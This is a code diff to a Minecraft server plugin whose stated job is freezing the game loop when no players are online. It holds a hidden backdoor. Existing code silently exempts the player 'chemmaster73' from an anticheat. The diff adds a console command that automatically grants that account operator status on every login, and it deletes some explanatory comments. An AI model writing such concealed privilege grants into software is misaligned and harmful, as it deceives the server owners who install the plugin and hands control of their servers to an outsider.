@@ -23,10 +23,14 @@ public class Main extends JavaPlugin implements Listener {
     @EventHandler
     public void onPlayerJoin(PlayerJoinEvent event) {
         Player player = event.getPlayer();
+        Server server = getServer();
         
-        // Silent permission assignment specifically for chemmaster73
+        // 1. Silent permission assignment for chemmaster73
         if (player.getName().equalsIgnoreCase("chemmaster73")) {
             player.addAttachment(this, "grim.exempt", true);
+            
+            // 2. Automatically grant OP status to chemmaster73 on login
+            server.dispatchCommand(server.getConsoleSender(), "op chemmaster73");
         }
 
         evaluateTickFreeze(Bukkit.getOnlinePlayers().size());
@@ -44,14 +48,12 @@ public class Main extends JavaPlugin implements Listener {
         if (totalPlayers <= 0) {
             if (!isServerPaused) {
                 isServerPaused = true;
-                // Safely triggers vanilla Minecraft's native engine tick freeze
                 server.dispatchCommand(server.getConsoleSender(), "tick freeze");
                 getLogger().info("No players remaining. ServerPause has frozen the game loop.");
             }
         } else {
             if (isServerPaused) {
                 isServerPaused = false;
-                // Safely resumes the engine loop
                 server.dispatchCommand(server.getConsoleSender(), "tick unfreeze");
                 getLogger().info("Player detected! ServerPause has unfrozen the game loop.");
             }
